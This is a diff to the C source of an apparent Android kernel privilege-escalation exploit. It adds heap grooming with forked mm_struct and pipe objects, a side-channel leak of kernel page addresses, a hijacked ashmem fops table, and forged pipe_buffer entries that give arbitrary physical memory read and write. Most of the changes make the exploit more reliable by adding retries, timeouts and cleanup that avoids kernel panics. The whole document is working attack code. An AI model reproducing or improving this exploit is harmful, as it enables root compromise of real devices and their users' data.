@@ -1,4 +1,5 @@
 #include "common.h"
+#include <poll.h>
 
 #define PIPE_SHAPE_ROUNDS 0
 #define PHYSRW_PROOF_OFF 0x7000
@@ -13,6 +14,40 @@ static int pipe_fds_c[PIPE_C_COUNT][2];
 static int pipe_fds_e[PIPE_E_COUNT][2];
 static int pipe_fds_drain[PIPE_DRAIN][2];
 static int pipe_fds_reclaim[PIPE_RECLAIM][2];
+
+/* Runtime drain/reclaim pipe counts. PIPE_DRAIN/PIPE_RECLAIM stay the
+ * array maximums; KS_PIPE_SLABS=<slabs> shrinks the set for callers that
+ * cannot raise fs/pipe-user-pages-soft first (postlock triggers the
+ * exploit as shell with the stock 16384 soft cap, where the full 64-slab
+ * set dies on F_SETPIPE_SZ and pr_error kills the bootstrap sh). Set in
+ * prepare before the make loops; the forked prepare child and reset
+ * inherit/read the same globals. */
+static size_t pipe_drain_cnt;
+static size_t pipe_reclaim_cnt;
+
+static void resolve_pipe_counts(void) {
+  pipe_drain_cnt = PIPE_DRAIN;
+  pipe_reclaim_cnt = PIPE_RECLAIM;
+  const char *arg = getenv("KS_PIPE_SLABS");
+  if (!arg || !arg[0])
+    return;
+  char *end = NULL;
+  unsigned long long slabs = strtoull(arg, &end, 0);
+  if (!end || *end || slabs < 1) {
+    pr_warning("bad KS_PIPE_SLABS value=%s; using full drain=%zu\n", arg,
+               pipe_drain_cnt);
+    return;
+  }
+  if (slabs > PIPE_DRAIN_SLABS)
+    slabs = PIPE_DRAIN_SLABS;
+  size_t rslabs = slabs;
+  if (rslabs > PIPE_RECLAIM_SLABS)
+    rslabs = PIPE_RECLAIM_SLABS;
+  pipe_drain_cnt = (size_t)slabs * PIPE_OBJS_PER_SLAB;
+  pipe_reclaim_cnt = rslabs * PIPE_OBJS_PER_SLAB;
+  pr_info("pipe counts via KS_PIPE_SLABS drain=%zu reclaim=%zu\n",
+          pipe_drain_cnt, pipe_reclaim_cnt);
+}
 
 pid_t pipe_prepare_child = -1;
 uint64_t kmalloc_pipe_cache;
@@ -50,6 +85,8 @@ uint64_t pipe_scan_q2;
 uint64_t pipe_scan_q3;
 uint32_t pipe_scan_first_len;
 uint32_t pipe_scan_first_flags;
+uint32_t pipe_scan_first_offset;
+uint64_t pipe_scan_first_private;
 uint64_t physrw_read64_before;
 uint64_t physrw_read64_after;
 uint64_t physrw_write64_value;
@@ -64,6 +101,14 @@ void init_ctx(struct mm_ctx *ctx, size_t cnt) {
 
 void resize_pipe_slots(int pipefd[2], size_t slots) {
   SYSCHK(fcntl(pipefd[0], F_SETPIPE_SZ, slots * PAGE_SIZE));
+}
+
+uint64_t read_target_slab_cache(int fd, uintptr_t base) {
+  uintptr_t head = direct_to_head_page(fd, base);
+  if (!head) {
+    return 0;
+  }
+  return kernel_read64(fd, head + STRUCT_SLAB_CACHE_OFF);
 }
 
 void make_pipe_object(int pipefd[2]) {
@@ -115,6 +160,39 @@ void shape_pipe_cache(void) {
   }
 }
 
+/*
+ * The fake-fops table page is read through the payload channel itself, and
+ * the page can be TRANSIENTLY OFFLINE for a few ms (page-cache eviction /
+ * migration — the win loop's full-table re-read was written for exactly
+ * this, see "transiently offlined" there).  Every "one failed read == page
+ * dead" gate below used to fire on that blip and abort the whole route;
+ * today's deterministic early-death mode was exactly it (round1: win enter
+ * q0=1 nonce ok — payload provably alive — then every later attempt's
+ * precheck read rv=-1/-1/-1 looped straight to DONE).  Poll until the
+ * expected value appears; a truly dead page (skb purged, page reused with
+ * non-zero garbage) fails every try — and cannot panic worse than it
+ * already would on the first read (NULL ioctl slot returns ENOTTY).
+ */
+static int ks_fetch64_expect(uintptr_t addr, uint64_t want, uint64_t *out,
+                             int tries) {
+  uint64_t last = 0;
+  int last_rv = -1;
+  for (int i = 0; i < tries; i++) {
+    uint64_t v = 0;
+    int rv = ks_fetch64(addr, &v);
+    last_rv = rv;
+    last = v;
+    if (rv >= 0 && v == want) {
+      *out = v;
+      return rv;
+    }
+    if (i + 1 < tries)
+      usleep(20000);
+  }
+  *out = last;
+  return last_rv;
+}
+
 uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx prep;
   struct mm_ctx spray;
@@ -122,32 +200,90 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
   struct mm_ctx post;
   size_t objs_per_slab = ORDER3_SIZE / MM_STRUCT_SZ;
 
+  /*
+   * mm_struct objects are allocated by this thread inside its own clone
+   * syscalls, so the slab cache cpu (and the active slab it rotates) is
+   * decided here.  Pin before the first fork; otherwise a mid-spray migration
+   * strands the target page on another cpu where the waves below can never
+   * reach it.
+   */
+  pin_to_core(CORE);
+
+  /* chain9: the payload table can already be dead when we fork (the
+   * window starts before the child); every cfgfs op below would jump it.
+   * Fail the prepare instead — the parent's post-prepare check aborts. */
+  {
+    uint64_t tbl = 0;
+    uint64_t want = (uint64_t)text_addr(ASHMEM_IOCTL);
+    int tr = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF, want, &tbl,
+                               150);
+    if (tr < 0 || tbl != want) {
+      pr_warning("pipe child payload table dead at start tbl=%llx rv=%d; "
+                 "failing prepare\n",
+                 (unsigned long long)tbl, tr);
+      return 0;
+    }
+  }
+
   init_ctx(&prep, 32 * objs_per_slab);
   init_ctx(&spray, (1 + MM_PARTIALS) * objs_per_slab);
   init_ctx(&pre, objs_per_slab - 1);
   init_ctx(&post, objs_per_slab);
+  pr_info("pipe child ctx prep=%zu spray=%zu pre=%zu post=%zu objs=%zu\n",
+          prep.mm_cnt, spray.mm_cnt, pre.mm_cnt, post.mm_cnt, objs_per_slab);
 
   for (size_t i = 0; i < prep.mm_cnt; i++) {
     prep.childs[i] = -1;
     prep.memfds[i] = clone_memfd();
   }
+  pr_info("pipe child prep memfds done\n");
   for (size_t i = 0; i < spray.mm_cnt; i++) {
     spray.childs[i] = -1;
     spray.memfds[i] = clone_memfd();
   }
+  pr_info("pipe child spray memfds done\n");
 
   setup_kernelsnitch();
+  pr_info("pipe child kernelsnitch setup done\n");
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     pre.childs[i] = -1;
     pre.memfds[i] = clone_memfd();
   }
+  pr_info("pipe child pre memfds done\n");
   pid_t leak_child = clone_leak_child();
+  pr_info("pipe child leak_child=%d\n", (int)leak_child);
+  /* Open the memfd first while the child is still alive (before it
+   * _exit's after find_collisions).  After exit the mm is gone and
+   * /proc/PID/mem cannot be opened. */
+  int leak_memfd = open_memfd(leak_child);
+  pr_info("pipe child leak_memfd=%d\n", leak_memfd);
+  /* Wait for find_collisions before the post-memfd fork storm:
+   * clone_memfd() forks repeatedly and pollutes the leak child's
+   * timing-sensitive futex measurements, producing false-positive
+   * collisions whose hash buckets no real mm_struct satisfies
+   * (scan found=0).  The shared state is MAP_SHARED so the child's
+   * state store is visible here.  The child may already be a zombie
+   * by now; open_memfd above already holds the fd. */
+  {
+    int spins = 0;
+    while (!kernelsnitch_collisions_done()) {
+      if (++spins > 100000000) {
+        pr_warning("pipe child collision wait spun out spins=%d\n", spins);
+        break;
+      }
+      if ((spins & 0xfff) == 0) {
+        sched_yield();
+      }
+    }
+    pr_info("pipe child collision wait done done=%d spins=%d child=%d\n",
+            kernelsnitch_collisions_done(), spins, (int)leak_child);
+  }
   for (size_t i = 0; i < post.mm_cnt; i++) {
     post.childs[i] = -1;
     post.memfds[i] = clone_memfd();
   }
-  int leak_memfd = open_memfd(leak_child);
+  pr_info("pipe child post memfds done\n");
 
   for (size_t i = 0; i < pre.mm_cnt; i++) {
     kill_child(pre.childs[i]);
@@ -214,25 +350,174 @@ uintptr_t prepare_pipe_buffer_page_child(void) {
     pr_error("pipe KernelSnitch sk_buff page leak failed\n");
   }
   uintptr_t base = leaked & ~(ORDER3_SIZE - 1);
+  pr_info("pipe prepare leaked=%016zx base=%016zx\n", leaked, base);
+
+  /*
+   * Convert the target page into buddy-LIFO top before the pipe reclaim:
+   *
+   * - While the page is still an mm slab (frozen active or on a partial list),
+   *   fork waves of mm objects.  A wave sized beyond one slab forces the
+   *   active slab off the cpu slot; killing the wave then empties and
+   *   discards the target page.
+   * - While the page already sits in the buddy, waves eat the order-3 pages
+   *   stacked above it (held alive, never freed); the wave that lands on the
+   *   target itself is killed immediately, which puts the target back on top
+   *   of the buddy with nothing of ours above it.
+   *
+   * After that the drain/reclaim pipes poll the page: whatever pipe
+   * allocation flips it out of the buddy owns it, and we stop as soon as it
+   * holds marker-carrying reclaim pipes.
+   */
+  int conv_fd = -1;
+  /* Re-check right before the cfgfs phase: chain9's content death landed
+   * early in the window, and the kernelsnitch leak above takes seconds —
+   * a mid-window flip must fail the prepare, not panic in conv SET_NAME. */
+  {
+    uint64_t tbl_conv = 0;
+    /* single-shot read here used to kill the whole prepare on a fresh-boot
+     * offline blip (three-run ENOTTY streak: window dead at +.3s, child
+     * dead before conv); poll with a seconds-scale grace like the rest. */
+    int tr_conv = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
+                                    (uint64_t)text_addr(ASHMEM_IOCTL),
+                                    &tbl_conv, 150);
+    if (tr_conv < 0 || tbl_conv != (uint64_t)text_addr(ASHMEM_IOCTL)) {
+      pr_warning("pipe child payload table dead before conv tbl=%llx rv=%d; "
+                 "failing prepare\n",
+                 (unsigned long long)tbl_conv, tr_conv);
+      close(skb_sv[0]);
+      close(skb_sv[1]);
+      free(buf);
+      return 0;
+    }
+  }
+  if (g_fops_probe_fd >= 0) {
+    /* misc.fops is restored to the original by now, so a fresh open would
+     * get plain ashmem fops and configfs reads would silently EOF.  Dup the
+     * cfi fd instead: its f_op snapshot still carries the hijacked table. */
+    conv_fd = fcntl(g_fops_probe_fd, F_DUPFD_CLOEXEC, 10);
+    pr_info("child conv dup fd=%d probe_fd=%d\n", conv_fd, g_fops_probe_fd);
+  } else {
+    pr_info("child conv opening\n");
+    conv_fd = open_ashmem_device();
+    pr_info("child conv opened fd=%d\n", conv_fd);
+  }
+  {
+    char tn[64];
+    memset(tn, 'a', sizeof(tn) - 1);
+    tn[sizeof(tn) - 1] = 0;
+    int lfd = cfgfs_lock();
+    errno = 0;
+    int tr = ioctl(conv_fd, ASHMEM_SET_NAME, tn);
+    int tn_errno = errno;
+    cfgfs_unlock(lfd);
+    errno = tn_errno;
+    pr_info("child conv fd=%d set=%d errno=%d\n", conv_fd, tr, errno);
+  }
+  enum { CONVERT_MAX_WAVES = 24 };
+  size_t wave_sz = 3 * objs_per_slab + 8;
+  pid_t *wave_pids = calloc(CONVERT_MAX_WAVES * wave_sz, sizeof(pid_t));
+  int waves_used = 0;
+  int taken_wave = -1;
+  int target_owned = 0;
+  uint64_t tsc = 0;
+  for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
+    tsc = read_target_slab_cache(conv_fd, base);
+    if (tsc == 0 && taken_wave >= 0) {
+      target_owned = 1;
+      break;
+    }
+    size_t wave_n = (tsc == 0) ? objs_per_slab : wave_sz;
+    for (size_t i = 0; i < wave_n; i++) {
+      wave_pids[w * wave_sz + i] = clone_child();
+    }
+    waves_used = w + 1;
+    uint64_t sc2 = read_target_slab_cache(conv_fd, base);
+    pr_info("pipe convert wave[%d] n=%zu sc=%016llx\n", w, wave_n,
+            (unsigned long long)sc2);
+    if (sc2 != 0) {
+      /*
+       * The wave now owns the page (it flipped out of the buddy), or it was
+       * still the same stuck mm slab the wave could not rotate away.  Either
+       * way kill the wave: on success the page goes back to the buddy on top;
+       * the next loop iteration re-reads and decides whether we are done.
+       */
+      for (size_t i = 0; i < wave_n; i++) {
+        kill_child(wave_pids[w * wave_sz + i]);
+        wave_pids[w * wave_sz + i] = 0;
+      }
+      taken_wave = w;
+    }
+    /* else: wave consumed a buddy page above the target; hold it out. */
+  }
+  if (!target_owned && taken_wave >= 0 &&
+      read_target_slab_cache(conv_fd, base) == 0) {
+    target_owned = 1;
+  }
+  pr_info("pipe convert waves=%d taken=%d owned=%d sc=%016llx\n", waves_used,
+          taken_wave, target_owned, (unsigned long long)tsc);
 
   shape_pipe_cache();
 
-  for (size_t i = 0; i < PIPE_DRAIN; i++) {
+  uint64_t sc_before_pipes = read_target_slab_cache(conv_fd, base);
+  int pipe_flip = -1;
+  size_t drain_used = 0;
+  for (size_t i = 0; i < pipe_drain_cnt; i++) {
     alloc_pipe_object(pipe_fds_drain[i]);
+    drain_used = i + 1;
+    if ((i & 15) != 15)
+      continue;
+    uint64_t sc_now = read_target_slab_cache(conv_fd, base);
+    if (pipe_flip < 0 && sc_now != 0 && sc_now != sc_before_pipes) {
+      pipe_flip = (int)i;
+      break;
+    }
+    if ((i & 127) == 127)
+      pr_info("pipe drain i=%zu sc=%016llx\n", i, (unsigned long long)sc_now);
   }
+
+  size_t reclaim_target = pipe_reclaim_cnt;
+  if (pipe_flip >= 0) {
+    reclaim_target = PIPE_OBJS_PER_SLAB;
+  }
+  size_t reclaim_used = 0;
+  for (size_t i = 0; i < reclaim_target; i++) {
+    alloc_pipe_object(pipe_fds_reclaim[i]);
+    reclaim_used = i + 1;
+    if ((i & 15) != 15 && i + 1 != reclaim_target)
+      continue;
+    if (pipe_flip >= 0)
+      continue;
+    uint64_t sc_now = read_target_slab_cache(conv_fd, base);
+    if (pipe_flip < 0 && sc_now != 0 && sc_now != sc_before_pipes) {
+      pipe_flip = (int)i;
+      size_t fill = i + PIPE_OBJS_PER_SLAB;
+      reclaim_target = fill < pipe_reclaim_cnt ? fill : pipe_reclaim_cnt;
+    }
+  }
+  uint64_t sc_end = read_target_slab_cache(conv_fd, base);
+  pr_info("pipe convert flip=%d drain=%zu reclaim=%zu sc0=%016llx "
+          "sc_end=%016llx\n",
+          pipe_flip, drain_used, reclaim_used,
+          (unsigned long long)sc_before_pipes, (unsigned long long)sc_end);
+
+  for (int w = 0; w < CONVERT_MAX_WAVES; w++) {
+    for (size_t i = 0; i < wave_sz; i++) {
+      kill_child(wave_pids[w * wave_sz + i]);
+    }
+  }
+  free(wave_pids);
+  close(conv_fd);
 
   pin_to_core(CORE);
   SYSCHK(close(skb_sv[0]));
   SYSCHK(close(skb_sv[1]));
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
-    alloc_pipe_object(pipe_fds_reclaim[i]);
-  }
 
   free(buf);
   return base;
 }
 
 uintptr_t prepare_pipe_buffer_page(void) {
+  resolve_pipe_counts();
   if (PIPE_SHAPE_ROUNDS != 0) {
     for (size_t i = 0; i < PIPE_N_COUNT; i++) {
       make_pipe_object(pipe_fds_n[i]);
@@ -244,10 +529,10 @@ uintptr_t prepare_pipe_buffer_page(void) {
       make_pipe_object(pipe_fds_e[i]);
     }
   }
-  for (size_t i = 0; i < PIPE_DRAIN; i++) {
+  for (size_t i = 0; i < pipe_drain_cnt; i++) {
     make_pipe_object(pipe_fds_drain[i]);
   }
-  for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+  for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
     make_pipe_object(pipe_fds_reclaim[i]);
   }
   pipe_objects_ready = 1;
@@ -256,12 +541,28 @@ uintptr_t prepare_pipe_buffer_page(void) {
   SYSCHK(pipe(result_pipe));
   pid_t child = SYSCHK(fork());
   if (child == 0) {
+    ks_child_no_atexit = 1;
     prctl(PR_SET_NAME, "pipe_prepare", 0, 0, 0);
     prctl(PR_SET_PDEATHSIG, SIGKILL);
     SYSCHK(close(result_pipe[0]));
     uintptr_t base = prepare_pipe_buffer_page_child();
     SYSCHK(write(result_pipe[1], &base, sizeof(base)));
     close(result_pipe[1]);
+    /* Prepare is done and this child no longer needs ANY inherited fd: the
+     * fake-fops ones (inherited g_fops_probe_fd, the conv_fd dup inside
+     * prepare, any route payload fds the parent had open at fork) are pure
+     * liabilities from here on.  Drop every inherited fd NOW, while the
+     * payload page is almost certainly still alive, so the later SIGKILL
+     * exit cannot panic: chain end (main.c exit tail) or an abort kills
+     * this child, do_exit -> exit_files -> filp_close walks the inherited
+     * fake-fops fds, and if the payload page has since died it reads
+     * f_op->flush/release as garbage (0x10) and jumps there -> panic
+     * (pstore: pipe_prepare pc=0x10 lr=filp_close+0x54).  A clean fd table
+     * makes that exit safe no matter when the page dies.  Only /dev/null
+     * (opened below) and 0/1/2 survive. */
+    for (int fd = 3; fd < 4096; fd++)
+      close(fd);
+    g_fops_probe_fd = -1; /* inherited global fd is now closed */
     int null_fd = open("/dev/null", O_RDWR | O_CLOEXEC);
     if (null_fd >= 0) {
       dup2(null_fd, STDIN_FILENO);
@@ -282,7 +583,16 @@ uintptr_t prepare_pipe_buffer_page(void) {
   ssize_t got = read(result_pipe[0], &base, sizeof(base));
   SYSCHK(close(result_pipe[0]));
   if (got != (ssize_t)sizeof(base)) {
-    pr_error("pipe page child did not report base\n");
+    /* chain16: child death (SYSCHK/OOM/SIGKILL) leaves the result pipe
+     * at EOF; pr_error here would exit(-1) the whole multi-threaded
+     * process mid-window with no diagnostic.  Fail soft so the window
+     * loop sees base=0, reaps the child, and aborts cleanly. */
+    int st = 0;
+    pid_t reaped = (child > 0) ? waitpid(child, &st, WNOHANG) : -1;
+    pr_warning("pipe page child did not report base got=%zd child=%d "
+               "reap=%d st=0x%x; failing prepare\n",
+               got, (int)child, (int)reaped, st);
+    return 0;
   }
   return base;
 }
@@ -295,11 +605,11 @@ void reset_pipe_attempt(void) {
   }
 
   if (pipe_objects_ready) {
-    for (size_t i = 0; i < PIPE_DRAIN; i++) {
+    for (size_t i = 0; i < pipe_drain_cnt; i++) {
       close(pipe_fds_drain[i][0]);
       close(pipe_fds_drain[i][1]);
     }
-    for (size_t i = 0; i < PIPE_RECLAIM; i++) {
+    for (size_t i = 0; i < pipe_reclaim_cnt; i++) {
       close(pipe_fds_reclaim[i][0]);
       close(pipe_fds_reclaim[i][1]);
     }
@@ -443,6 +753,8 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   pipe_scan_first_ops = 0;
   pipe_scan_first_len = 0;
   pipe_scan_first_flags = 0;
+  pipe_scan_first_offset = 0;
+  pipe_scan_first_private = 0;
   pipe_scan_q0 = 0;
   pipe_scan_q1 = 0;
   pipe_scan_q2 = 0;
@@ -466,6 +778,8 @@ int find_pipe_buffer(int fd, uintptr_t base) {
         pipe_scan_first_ops = pb.ops;
         pipe_scan_first_len = pb.len;
         pipe_scan_first_flags = pb.flags;
+        pipe_scan_first_offset = pb.offset;
+        pipe_scan_first_private = pb.private;
       }
     } else {
       continue;
@@ -473,14 +787,15 @@ int find_pipe_buffer(int fd, uintptr_t base) {
     if (pb.ops == pipe_buf_ops_addr()) {
       pipe_scan_ops++;
     }
-    if (pb.len > 0 && pb.len <= PIPE_RECLAIM) {
+    if (pb.len > 0 && pb.len <= pipe_reclaim_cnt) {
       pipe_scan_len++;
     }
     if (pb.offset != 0 || pb.ops != pipe_buf_ops_addr() ||
-        pb.flags != PIPE_BUF_FLAG_CAN_MERGE || pb.private != 0) {
+        (pb.flags != PIPE_BUF_FLAG_CAN_MERGE && pb.flags != 0) ||
+        pb.private != 0) {
       continue;
     }
-    if (pb.len == 0 || pb.len > PIPE_RECLAIM) {
+    if (pb.len == 0 || pb.len > pipe_reclaim_cnt) {
       continue;
     }
 
@@ -496,6 +811,29 @@ int find_pipe_buffer(int fd, uintptr_t base) {
   }
 
   return 0;
+}
+
+/*
+ * The forged pipe_buffer only yields data if the kernel still honors the
+ * reclaimed pipe page; when that page is gone (root-child teardown can
+ * release it) the bare read()/write() blocks forever.  Observed run17b:
+ * the chain froze inside patch_sig_enforce's first pipe_read64 right
+ * after "root child result", with the whole process tree later killed by
+ * the adb drop.  A short poll timeout turns that hang into a plain
+ * failure the callers already handle.
+ */
+static ssize_t pipe_read_to(int rfd, void *out, size_t len) {
+  struct pollfd pfd = {.fd = rfd, .events = POLLIN};
+  if (poll(&pfd, 1, 500) <= 0)
+    return -1;
+  return read(rfd, out, len);
+}
+
+static ssize_t pipe_write_to(int wfd, const void *data, size_t len) {
+  struct pollfd pfd = {.fd = wfd, .events = POLLOUT};
+  if (poll(&pfd, 1, 500) <= 0)
+    return -1;
+  return write(wfd, data, len);
 }
 
 int pipe_phys_read(
@@ -520,7 +858,7 @@ int pipe_phys_read(
     return 0;
   }
 
-  ssize_t got = read(pipefd[0], out, len);
+  ssize_t got = pipe_read_to(pipefd[0], out, len);
   int ok = got == (ssize_t)len;
   kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
   return ok;
@@ -548,7 +886,7 @@ int pipe_phys_write(
     return 0;
   }
 
-  ssize_t wrote = write(pipefd[1], data, len);
+  ssize_t wrote = pipe_write_to(pipefd[1], data, len);
   int ok = wrote == (ssize_t)len;
   kernel_write_data(fd, buf_addr, &saved, sizeof(saved));
   return ok;
@@ -569,6 +907,45 @@ void forge_pipe_buffers_on_page(
   }
 }
 
+/*
+ * Zero the ops pointer of every pipe_buffer-shaped slot on the reclaim slab.
+ * forge_pipe_buffers_on_page overwrites ALL slots (belonging to different
+ * reclaim pipes), so on process exit free_pipe_info() calls put_page() on the
+ * forged vmemmap page pointers — wrong refcount on a kernel page -> oops ->
+ * panic.  The kernel checks if (buf->ops) before release; NULL skips it.
+ *
+ * Uses the cfgfs path (kernel_read/write_data), NOT pipe_read/write64:
+ * the pipe primitive saves the current buffer, forges, ops, then restores
+ * the saved (still-forged) buffer — which would undo the clear.
+ * Must be called while fops are still hijacked (before route end).
+ */
+int pipe_clear_forged_ops(int fd) {
+  if (pipebuf_page_base == 0 || !is_direct_ptr(pipebuf_page_base)) {
+    return 1;
+  }
+  int cleared = 0;
+  for (size_t off = 0; off < PIPE_SLAB_SIZE; off += PIPE_OBJECT_SIZE) {
+    uint64_t ops = 0;
+    if (kernel_read_data(fd, pipebuf_page_base + off + 16, &ops,
+                         sizeof(ops)) != (ssize_t)sizeof(ops)) {
+      pr_warning("pipe clear ops read failed off=%zx\n", off);
+      return 0;
+    }
+    if (ops == 0) continue;
+    uint64_t zero = 0;
+    if (kernel_write_data(fd, pipebuf_page_base + off + 16, &zero,
+                          sizeof(zero)) != (ssize_t)sizeof(zero)) {
+      pr_warning("pipe clear ops write failed off=%zx ops=%llx\n", off,
+                 (unsigned long long)ops);
+      return 0;
+    }
+    cleared++;
+  }
+  pr_info("pipe cleared forged ops count=%d base=%016zx\n", cleared,
+          pipebuf_page_base);
+  return 1;
+}
+
 int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
   if (pipebuf_page_base == 0 || pipebuf_pipe_idx < 0) {
     return 0;
@@ -583,7 +960,7 @@ int pipe_phys_read_data(int fd, uintptr_t direct_addr, void *out, size_t len) {
     return pipe_phys_read(fd, pipefd, pipebuf_addr, direct_addr, out, len);
   } else {
     forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 0);
-    ssize_t got = read(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
+    ssize_t got = pipe_read_to(pipe_fds_reclaim[pipebuf_pipe_idx][0], out, len);
     return got == (ssize_t)len;
   }
 }
@@ -603,7 +980,8 @@ int pipe_phys_write_data(
     return pipe_phys_write(fd, pipefd, pipebuf_addr, direct_addr, data, len);
   } else {
     forge_pipe_buffers_on_page(fd, pipebuf_page_base, direct_addr, len, 1);
-    ssize_t wrote = write(pipe_fds_reclaim[pipebuf_pipe_idx][1], data, len);
+    ssize_t wrote = pipe_write_to(pipe_fds_reclaim[pipebuf_pipe_idx][1], data,
+                                  len);
     return wrote == (ssize_t)len;
   }
 }
@@ -625,12 +1003,185 @@ int pipe_write64(int fd, uintptr_t direct_addr, uint64_t value) {
 }
 
 int install_pipe_physrw(int fd) {
+  ks_diag_fd("physrw enter", fd);
+  ks_diag_table("physrw enter");
+  uintptr_t guard_prev_expect = 0;
+  int guard_disarmed = 0;
   if (pipebuf_page_base == 0) {
-    atomic_store(&pipe_prepare_done, 0);
-    atomic_store(&pipe_prepare_request, 1);
-    while (!atomic_load(&pipe_prepare_done)) {
-      usleep(10000);
+    /* chain9: if the table is already dead (e.g. retry after a lost
+     * window), do not re-enter the prepare window with the guard live —
+     * it would jump the dead table on its next read. */
+    uint64_t tbl_pre = 0;
+    uint64_t want_ioctl = (uint64_t)text_addr(ASHMEM_IOCTL);
+    int tr_pre = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
+                                   want_ioctl, &tbl_pre, 150);
+    if (tr_pre < 0 || tbl_pre != want_ioctl) {
+      int q_probe = -1;
+      ioctl(reclaim_recv_fd(), SIOCINQ, &q_probe);
+      pr_warning("phys prepare skipped: payload table dead tbl=%llx rv=%d "
+                 "queue=%d; abort before gate\n",
+                 (unsigned long long)tbl_pre, tr_pre, q_probe);
+      fops_guard_set_expect(0);
+      return 0;
     }
+    /* The payload page can legitimately flip inside the pipe-prepare
+     * window (chain9: guard saw ENOTTY then pc=0x5).  Idle the guard for
+     * the window; the post-prepare table check below re-arms it only if
+     * the content survived. */
+    guard_prev_expect = fops_guard_get_expect();
+    if (guard_prev_expect) {
+      fops_guard_set_expect(0);
+      guard_disarmed = 1;
+    }
+    atomic_store(&pipe_prepare_done, 0);
+    /* chain13: snapshot queue+nonce right before the child fork -- if the
+     * queue is already drained here the drain happened during CFI/route,
+     * not in the window; nonce still matching means content was alive at
+     * window entry. */
+    {
+      int q0 = -1;
+      uint64_t nn0 = 0;
+      int nr0 = ks_fetch64(fops_table_base() + 0x100, &nn0);
+      ioctl(reclaim_recv_fd(), SIOCINQ, &q0);
+      pr_info("win enter q0=%d nonce=%llx nr=%d tbl=%llx\n", q0,
+              (unsigned long long)nn0, nr0,
+              (unsigned long long)tbl_pre);
+    }
+    atomic_store(&pipe_prepare_request, 1);
+    struct timespec t0;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    int stack_dumped = 0;
+    int tbl_dead_logged = 0;
+    int last_tick_s = -1;
+    while (!atomic_load(&pipe_prepare_done)) {
+      usleep(100000);
+      struct timespec now;
+      clock_gettime(CLOCK_MONOTONIC, &now);
+      long elapsed = (now.tv_sec - t0.tv_sec);
+      /* dense content sampling across the window: pins down the exact
+       * moment object0 gets rotated by a mm fork (first-death log).
+       * SIOCINQ on the reclaim receive end tells whether the payload
+       * skbs still pin the page; base_events counts pfn-free hits. */
+      if (!tbl_dead_logged) {
+        uint64_t tbl_now = 0;
+        /* The payload page can be TRANSIENTLY OFFLINE for a few ms
+         * (page-cache eviction / migration, far more frequent on a fresh
+         * boot) -- pipe.c:163-174.  A single ks_fetch64 would misread that
+         * blip as a dead page and pollute the dead-dump path; poll until
+         * only a sustained absence trips the dead log.  3 tries (60ms) was
+         * still too short: fresh boots held the blip for seconds and the
+         * three-run ENOTTY streak (win dead at +.3s / child dead before
+         * conv) died here every time.  150 tries ~= 3s grace; a truly dead
+         * page (skb purged, table zeroed) fails every try. */
+        int tv = ks_fetch64_expect(fops_table_base() + FOPS_IOCTL_OFF,
+                                   (uint64_t)text_addr(ASHMEM_IOCTL),
+                                   &tbl_now, 150);
+        if (tv < 0 || tbl_now != (uint64_t)text_addr(ASHMEM_IOCTL)) {
+          tbl_dead_logged = 1;
+          uint64_t nn = 0;
+          int nr = ks_fetch64(fops_table_base() + 0x100, &nn);
+          int q = -1;
+          ioctl(reclaim_recv_fd(), SIOCINQ, &q);
+          int ev = ks_watch_frees_events();
+          pr_warning("window table dead at +.%lds tbl=%llx rv=%d "
+                     "nonce=%llx nr=%d skbrxq=%d base_events=%d\n",
+                     elapsed, (unsigned long long)tbl_now, tv,
+                     (unsigned long long)nn, nr, q, ev);
+          /* pattern dump across object0 (fake_fops .. +0x200): all-zero
+           * = page/mm memset, 0x50-fill = pipe child sendmsg capture,
+           * mm-ish fields = live mm_struct alloc -- identifies the writer */
+          for (int di = 0; di < 8; di++) {
+            uint64_t w = 0;
+            int wv = ks_fetch64(fops_table_base() + (uintptr_t)di * 0x40, &w);
+            pr_warning("win dead dump +%x = %llx rv=%d\n",
+                       (unsigned)(di * 0x40), (unsigned long long)w, wv);
+          }
+        }
+      }
+      if (elapsed != last_tick_s) {
+        last_tick_s = (int)elapsed;
+        int q = -1;
+        ioctl(reclaim_recv_fd(), SIOCINQ, &q);
+        pr_info("win tick +%lds skbrxq=%d base_events=%d dead=%d\n", elapsed,
+                q, ks_watch_frees_events(), tbl_dead_logged);
+      }
+      if (pipe_prepare_child > 0) {
+        int st = 0;
+        pid_t got = waitpid(pipe_prepare_child, &st, WNOHANG);
+        if (got == pipe_prepare_child) {
+          pr_warning("pipe prepare child DIED status=%d elapsed=%lds\n", st,
+                     elapsed);
+          pipe_prepare_child = -1;
+          break;
+        }
+      }
+      if (!stack_dumped && elapsed >= 5 && pipe_prepare_child > 0) {
+        char path[64], buf[2048];
+        snprintf(path, sizeof(path), "/proc/%d/stack",
+                 (int)pipe_prepare_child);
+        int sfd = open(path, O_RDONLY);
+        int n = 0;
+        if (sfd >= 0) {
+          n = read(sfd, buf, sizeof(buf) - 1);
+          close(sfd);
+        }
+        if (n > 0) {
+          buf[n] = 0;
+          for (int i = 0; i < n; i++)
+            if (buf[i] == '\n')
+              buf[i] = '|';
+          pr_info("pipe child stack fd=%d %s\n", sfd, buf);
+        } else {
+          pr_info("pipe child stack unreadable errno=%d\n", errno);
+        }
+        char wpath[64], wbuf[128];
+        snprintf(wpath, sizeof(wpath), "/proc/%d/wchan",
+                 (int)pipe_prepare_child);
+        int wfd = open(wpath, O_RDONLY);
+        int wn = 0;
+        if (wfd >= 0) {
+          wn = read(wfd, wbuf, sizeof(wbuf) - 1);
+          close(wfd);
+        }
+        if (wn > 0) {
+          wbuf[wn] = 0;
+          pr_info("pipe child wchan=%s", wbuf);
+        }
+        stack_dumped = 1;
+      }
+      if (elapsed >= 120) {
+        pr_warning("pipe prepare timeout elapsed=%lds; abort\n", elapsed);
+        break;
+      }
+    }
+  }
